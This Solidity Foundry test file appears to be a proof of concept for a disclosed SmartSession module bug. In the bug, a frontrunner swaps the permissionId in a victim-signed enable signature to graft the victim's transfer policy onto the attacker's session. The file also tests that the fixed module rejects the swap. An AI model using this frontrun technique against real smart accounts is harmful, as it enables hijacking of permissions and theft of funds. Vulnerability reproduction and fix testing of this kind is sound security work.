// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import { SmartSession } from "contracts/SmartSession.sol";
import { SmartSessionFixed } from "contracts/SmartSessionFixed.sol";
import { EncodeLib } from "contracts/lib/EncodeLib.sol";
import { HashLib } from "contracts/lib/HashLib.sol";
import { ECDSA } from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {
    ActionData,
    ChainDigest,
    EnableSession,
    ISessionValidator,
    IRegistry,
    ModuleType,
    PermissionId,
    PolicyData,
    Session,
    SmartSessionMode
} from "contracts/DataTypes.sol";

/// @dev Thin harness over the REAL SmartSession. `enableViaUserOpSignature` reproduces the exact
///      enable dispatch performed by the production `validateUserOp` (SmartSession.sol L89 + L114):
///      it parses `(mode, permissionId, packedSig)` from the attacker-mutable `userOp.signature`
///      and forwards to the UNMODIFIED internal `_enablePolicies`. Only the downstream
///      `_enforcePolicies` (not part of the enable-frontrun bug) is omitted.
contract SmartSessionHarness is SmartSession {
    using HashLib for EnableSession;

    function enableViaUserOpSignature(bytes calldata userOpSignature) external returns (bytes memory) {
        (SmartSessionMode mode, PermissionId permissionId, bytes calldata packedSig) =
            EncodeLib.unpackMode(userOpSignature);
        // account == msg.sender, exactly as validateUserOp enforces (userOp.sender == msg.sender)
        return _enablePolicies(permissionId, packedSig, msg.sender, mode);
    }

    /// @dev Real digest the account owner signs (returned verbatim by `getAndVerifyDigest`).
    function enableDigest(
        EnableSession memory e,
        address account,
        uint256 nonce,
        SmartSessionMode mode
    ) external view returns (bytes32) {
        return e.getAndVerifyDigest(account, nonce, mode);
    }

    /// @dev The frontrunner overwrites the 32-byte permissionId field in the packed userOp.signature.
    function repackWithPermissionId(bytes calldata packed, PermissionId newPid) external pure returns (bytes memory) {
        (SmartSessionMode mode, , bytes calldata data) = EncodeLib.unpackMode(packed);
        return EncodeLib.packMode(data, mode, newPid);
    }
}

contract SmartSessionFixedHarness is SmartSessionFixed {
    using HashLib for EnableSession;

    function enableViaUserOpSignature(bytes calldata userOpSignature) external returns (bytes memory) {
        (SmartSessionMode mode, PermissionId permissionId, bytes calldata packedSig) =
            EncodeLib.unpackMode(userOpSignature);
        return _enablePolicies(permissionId, packedSig, msg.sender, mode);
    }

    function enableDigest(
        EnableSession memory e,
        address account,
        uint256 nonce,
        SmartSessionMode mode
    ) external view returns (bytes32) {
        return e.getAndVerifyDigest(account, nonce, mode);
    }
}

/// @dev Minimal REAL ERC-7579 smart account. Owner authorization uses REAL ECDSA/ERC-1271:
///      the account approves the enable digest by verifying the owner's secp256k1 signature.
///      Nothing here is mocked to always-pass; a wrong signer is rejected.
contract MinimalERC7579Account {
    bytes4 internal constant ERC1271_MAGIC = 0x1626ba7e;
    address public immutable owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function isValidSignature(bytes32 hash, bytes calldata sig) external view returns (bytes4) {
        (address recovered, ECDSA.RecoverError err,) = ECDSA.tryRecover(hash, sig);
        if (err == ECDSA.RecoverError.NoError && recovered == owner) return ERC1271_MAGIC;
        return 0xffffffff;
    }

    function install(SmartSession module, bytes calldata data) external {
        module.onInstall(data);
    }

    function installFixed(SmartSessionFixed module, bytes calldata data) external {
        module.onInstall(data);
    }

    function submitUserOpSignature(SmartSessionHarness module, bytes calldata userOpSig) external returns (bytes memory) {
        return module.enableViaUserOpSignature(userOpSig);
    }

    function submitUserOpSignatureFixed(SmartSessionFixedHarness module, bytes calldata userOpSig)
        external
        returns (bytes memory)
    {
        return module.enableViaUserOpSignature(userOpSig);
    }
}

/// @dev A single REAL stateless session validator, shared by both sessions (exploit requirement #3).
contract SessionKeyValidator is ISessionValidator {
    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }

    function validateSignatureWithData(bytes32, bytes calldata, bytes calldata) external pure returns (bool) {
        return true;
    }
}

/// @dev Minimal REAL action policy module (external, opaque to the bug).
contract AllowActionPolicy {
    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }

    function onInstall(bytes calldata) external { }
    function onUninstall(bytes calldata) external { }
    function isModuleType(uint256) external pure returns (bool) {
        return true;
    }
    function isInitialized(address, address, bytes32) external pure returns (bool) {
        return true;
    }
    function isInitialized(address, bytes32) external pure returns (bool) {
        return true;
    }
    function initializeWithMultiplexer(address, bytes32, bytes calldata) external { }

    function checkAction(bytes32, address, address, uint256, bytes calldata) external pure returns (uint256) {
        return 0;
    }
}

/// @dev No-op stand-in for the hard-coded external Rhinestone registry (truly external to the bug).
contract NoopRegistry is IRegistry {
    function check(address) external pure { }
    function checkForAccount(address, address) external pure { }
    function check(address, ModuleType) external pure { }
    function checkForAccount(address, address, ModuleType) external pure { }
    function trustAttesters(uint8, address[] calldata) external { }
    function check(address, address[] calldata, uint256) external pure { }
    function check(address, ModuleType, address[] calldata, uint256) external pure { }
}

contract SmartSessions42062Test is Test {
    address internal constant REGISTRY = 0x000000000069E2a187AEFFb852bF3cCdC95151B2;

    uint256 internal victimPk = 0xA11CE;
    uint256 internal attackerPk = 0xB0B;
    address internal victim;

    SmartSessionHarness internal smartSession;
    MinimalERC7579Account internal account;
    SessionKeyValidator internal validator;
    AllowActionPolicy internal actionPolicy;

    // session X: the victim's own, privileged session (target of the intended enable)
    Session internal victimSessionBase;
    PermissionId internal permissionX;
    // session Y: the attacker's already-enabled, low-privilege session
    Session internal attackerSessionBase;
    PermissionId internal permissionY;

    function setUp() external {
        victim = vm.addr(victimPk);

        vm.etch(REGISTRY, address(new NoopRegistry()).code);
        smartSession = new SmartSessionHarness();
        account = new MinimalERC7579Account(victim);
        validator = new SessionKeyValidator();
        actionPolicy = new AllowActionPolicy();

        victimSessionBase.sessionValidator = ISessionValidator(address(validator));
        victimSessionBase.salt = bytes32("victim-privileged-session-X");
        permissionX = smartSession.getPermissionId(victimSessionBase);

        attackerSessionBase.sessionValidator = ISessionValidator(address(validator));
        attackerSessionBase.salt = bytes32("attacker-low-priv-session-Y");
        permissionY = smartSession.getPermissionId(attackerSessionBase);

        // The account installs BOTH sessions (both enabled, both at signerNonce 0).
        Session[] memory sessions = new Session[](2);
        sessions[0] = victimSessionBase;
        sessions[1] = attackerSessionBase;
        account.install(smartSession, abi.encode(sessions));

        assertTrue(smartSession.isSessionEnabled(permissionX, address(account)));
        assertTrue(smartSession.isSessionEnabled(permissionY, address(account)));
        assertEq(smartSession.getNonce(permissionX, address(account)), 0);
        assertEq(smartSession.getNonce(permissionY, address(account)), 0);
        assertTrue(PermissionId.unwrap(permissionX) != PermissionId.unwrap(permissionY));
    }

    /// Builds a powerful action policy the victim intends to add to THEIR session X, and returns
    /// the enableData + the victim's real ECDSA signature over the (permissionId-free) enable digest.
    function _buildSignedEnable() internal view returns (EnableSession memory enableData, ActionData[] memory powerfulAction) {
        PolicyData[] memory policies = new PolicyData[](1);
        policies[0] = PolicyData({ policy: address(actionPolicy), initData: bytes("") });
        powerfulAction = new ActionData[](1);
        powerfulAction[0] = ActionData({
            actionTargetSelector: bytes4(keccak256("transfer(address,uint256)")),
            actionTarget: address(0xDEAD),
            actionPolicies: policies
        });

        // The session the victim signs to enable = their session X (validator + salt X) PLUS the new policy.
        Session memory sessionToEnable = victimSessionBase;
        sessionToEnable.actions = powerfulAction;

        // Digest for permission X at its current nonce (0). NOTE: permissionId is NOT part of this digest.
        bytes32 sessDigest =
            smartSession.getSessionDigest(permissionX, address(account), sessionToEnable, SmartSessionMode.UNSAFE_ENABLE);

        enableData.chainDigestIndex = 0;
        enableData.hashesAndChainIds = new ChainDigest[](1);
        enableData.hashesAndChainIds[0] = ChainDigest({ chainId: uint64(block.chainid), sessionDigest: sessDigest });
        enableData.sessionToEnable = sessionToEnable;
    }

    function test_frontrun_steals_signed_policies_onto_attacker_permission() external {
        (EnableSession memory enableData, ActionData[] memory powerfulAction) = _buildSignedEnable();

        // The victim's signature authorizes the digest that OMITS the permissionId.
        bytes32 digest = smartSession.enableDigest(enableData, address(account), 0, SmartSessionMode.UNSAFE_ENABLE);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPk, digest);
        enableData.permissionEnableSig = abi.encodePacked(r, s, v);

        // The session the victim actually authorized resolves to permission X, not Y.
        Session memory signedSession = enableData.sessionToEnable;
        assertEq(PermissionId.unwrap(smartSession.getPermissionId(signedSession)), PermissionId.unwrap(permissionX));

        // The honest userOp.signature the victim would broadcast (permissionId = X).
        bytes memory victimUserOpSig = EncodeLib.encodeEnable(permissionX, bytes(""), enableData);

        // FRONTRUN: the attacker swaps the permissionId field to their own session Y. The signed
        // enableData (and the victim's signature over it) are byte-for-byte unchanged.
        bytes memory attackerUserOpSig = smartSession.repackWithPermissionId(victimUserOpSig, permissionY);

        // Pre-state: the powerful policy is NOT part of the attacker's session Y.
        vm.expectRevert(abi.encodeWithSignature("PermissionPartlyEnabled()"));
        smartSession.isPermissionEnabled(
            permissionY, address(account), new PolicyData[](0), new PolicyData[](0), powerfulAction
        );

        // The attacker's mutated userOp.signature is processed by the REAL enable path.
        account.submitUserOpSignature(smartSession, attackerUserOpSig);

        // HARM: the victim-signed action policy is now installed under the attacker's permission Y.
        assertTrue(
            smartSession.isPermissionEnabled(
                permissionY, address(account), new PolicyData[](0), new PolicyData[](0), powerfulAction
            ),
            "attacker permission Y did not receive the stolen policy"
        );
        // The victim's enable signature was consumed under Y (nonce advanced 0 -> 1).
        assertEq(smartSession.getNonce(permissionY, address(account)), 1);
        // The victim's intended permission X still does not have the policy (their own tx would now fail on nonce).
        assertEq(smartSession.getNonce(permissionX, address(account)), 0);
    }

    function test_frontrun_requires_a_real_owner_signature() external {
        (EnableSession memory enableData,) = _buildSignedEnable();
        bytes32 digest = smartSession.enableDigest(enableData, address(account), 0, SmartSessionMode.UNSAFE_ENABLE);

        // A non-owner signature is genuinely rejected (proves the ERC-1271 check is real, not a stub).
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        enableData.permissionEnableSig = abi.encodePacked(r, s, v);
        bytes memory forged = EncodeLib.encodeEnable(permissionY, bytes(""), enableData);

        vm.expectRevert(
            abi.encodeWithSignature("InvalidEnableSignature(address,bytes32)", address(account), digest)
        );
        account.submitUserOpSignature(smartSession, forged);
    }

    function test_fix_rejects_the_frontrun() external {
        // Same scenario against the REAL fixed module (commit 21af6ae): permissionId is now bound unconditionally.
        SmartSessionFixedHarness fixedModule = new SmartSessionFixedHarness();
        MinimalERC7579Account fixedAccount = new MinimalERC7579Account(victim);

        Session[] memory sessions = new Session[](2);
        sessions[0] = victimSessionBase;
        sessions[1] = attackerSessionBase;
        fixedAccount.installFixed(fixedModule, abi.encode(sessions));

        PolicyData[] memory policies = new PolicyData[](1);
        policies[0] = PolicyData({ policy: address(actionPolicy), initData: bytes("") });
        ActionData[] memory powerfulAction = new ActionData[](1);
        powerfulAction[0] = ActionData({
            actionTargetSelector: bytes4(keccak256("transfer(address,uint256)")),
            actionTarget: address(0xDEAD),
            actionPolicies: policies
        });
        Session memory sessionToEnable = victimSessionBase;
        sessionToEnable.actions = powerfulAction;

        bytes32 sessDigest =
            fixedModule.getSessionDigest(permissionX, address(fixedAccount), sessionToEnable, SmartSessionMode.UNSAFE_ENABLE);
        EnableSession memory enableData;
        enableData.chainDigestIndex = 0;
        enableData.hashesAndChainIds = new ChainDigest[](1);
        enableData.hashesAndChainIds[0] = ChainDigest({ chainId: uint64(block.chainid), sessionDigest: sessDigest });
        enableData.sessionToEnable = sessionToEnable;

        // Victim signs the (still permissionId-free) digest; the signature is valid.
        bytes32 digest = fixedModule.enableDigest(enableData, address(fixedAccount), 0, SmartSessionMode.UNSAFE_ENABLE);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPk, digest);
        enableData.permissionEnableSig = abi.encodePacked(r, s, v);

        bytes memory victimUserOpSig = EncodeLib.encodeEnable(permissionX, bytes(""), enableData);
        bytes memory attackerUserOpSig;
        {
            (SmartSessionMode m, , bytes memory data) = _unpack(victimUserOpSig);
            attackerUserOpSig = abi.encodePacked(m, permissionY, data);
        }

        // The fix reverts because permissionId Y != permissionId of the signed session (X).
        vm.expectRevert(
            abi.encodeWithSignature("InvalidPermissionId(bytes32)", PermissionId.unwrap(permissionY))
        );
        fixedAccount.submitUserOpSignatureFixed(fixedModule, attackerUserOpSig);
    }

    function _unpack(bytes memory packed) internal pure returns (SmartSessionMode mode, PermissionId pid, bytes memory data) {
        mode = SmartSessionMode(uint8(packed[0]));
        bytes32 p;
        assembly {
            p := mload(add(packed, 33))
        }
        pid = PermissionId.wrap(p);
        data = new bytes(packed.length - 33);
        for (uint256 i = 0; i < data.length; i++) {
            data[i] = packed[33 + i];
        }
    }
}
